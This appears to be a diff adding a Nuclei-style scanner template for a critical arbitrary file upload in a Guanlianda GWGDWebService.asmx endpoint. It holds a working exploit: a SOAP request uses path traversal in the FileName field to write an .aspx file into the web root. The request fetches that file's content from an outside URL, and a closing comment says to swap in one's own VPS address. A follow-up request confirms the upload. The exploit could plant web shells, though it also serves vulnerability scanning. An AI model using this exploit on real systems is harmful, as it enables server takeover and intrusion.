@@ -1,0 +1,55 @@
+id: guanlianda-GWGDWebService-upload
+info:
+  name: guanlianda-GWGDWebService-upload
+  author: guanlianda-GWGDWebService-upload
+  severity: critical
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+
+requests:
+  - raw:
+      - |
+        POST /GB/LK/ArchiveManagement/Js/GWGDWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Length: 968
+        Content-Type: text/xml; charset=utf-8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+         <soapenv:Header/>
+         <soapenv:Body>
+          <tem:GetGWGDData>
+            <!--Optional:-->
+            <tem:data>
+             <root>
+               <GWINFO>
+                <公文标题>1</公文标题>
+                <拟稿人>拟稿人</拟稿人>
+                <主送单位>主送单位</主送单位>
+                <主题词>主题词</主题词>
+                <印发份数>1</印发份数>
+                <签发日期>2022-12-07</签发日期>
+               </GWINFO>
+               <aa>
+                <FileName>./../../../../../../../applications/gtp-default/Web/Common/{{filename}}.aspx</FileName>
+                <DownLoadURL>https://pastebin.com/raw/TMBFBLMM</DownLoadURL>
+               </aa>
+             </root>
+            </tem:data>
+          </tem:GetGWGDData>
+         </soapenv:Body>
+        </soapenv:Envelope>
+  
+      - |
+        GET /Common/{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body_2,"assdfdssasdad")'
+
+#DownLoadURL 换成自己vps ip
